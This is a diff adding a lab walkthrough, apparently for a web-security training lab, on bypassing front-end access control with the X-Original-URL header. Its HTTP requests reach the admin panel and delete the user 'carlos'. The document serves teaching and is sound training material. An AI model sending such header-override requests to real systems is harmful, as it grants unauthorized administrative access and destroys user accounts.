@@ -1582,3 +1582,149 @@ because a low-privileged user gains higher privileges.
 
 ---
 
+![Lab 01](Screenshots/lab5a.png)
+
+# Access Control Bypass via X-Original-URL Header
+
+## Step 1: Attempt to Access Admin Panel
+
+Browse to:
+
+```text
+/admin
+```
+
+Observe:
+
+```text
+Access Denied
+```
+
+or
+
+```text
+Unauthorized
+```
+
+Notice the response is very simple, suggesting the restriction is enforced by a front-end system.
+
+
+## Step 2: Send Request to Repeater
+
+1. In Burp Suite, locate the request:
+
+```http
+GET /admin HTTP/2
+```
+
+2. Right-click.
+3. Select:
+
+```text
+Send to Repeater
+```
+
+## Step 3: Test X-Original-URL Header
+
+Change the request to:
+
+```http
+GET / HTTP/2
+Host: LAB-ID.web-security-academy.net
+X-Original-URL: /invalid
+```
+
+Click:
+
+```text
+Send
+```
+
+Response:
+
+```text
+Not Found
+```
+
+This indicates:
+
+```text
+The back-end is processing the URL supplied in X-Original-URL.
+```
+
+
+## Step 4: Access the Admin Panel
+
+Modify the header:
+
+```http
+GET / HTTP/2
+Host: LAB-ID.web-security-academy.net
+X-Original-URL: /admin
+```
+
+Click:
+
+```text
+Send
+```
+
+Response:
+
+```text
+Admin Panel
+```
+
+You now have access to the administrator interface.
+
+
+# Delete Carlos
+
+## Step 5: Find the Delete Function
+
+The admin panel contains a delete endpoint similar to:
+
+```text
+/admin/delete?username=carlos
+```
+
+## Step 6: Bypass the Restriction
+
+Modify the request:
+
+```http
+GET /?username=carlos HTTP/2
+Host: LAB-ID.web-security-academy.net
+X-Original-URL: /admin/delete
+```
+
+Click:
+
+```text
+Send
+```
+
+
+## Step 7: Carlos Deleted
+
+Response indicates:
+
+```text
+User deleted
+```
+
+or redirects back to the admin panel.
+
+
+## Step 8: Lab Solved
+
+After deleting:
+
+```text
+carlos
+```
+
+the lab is solved.
+
+---
+
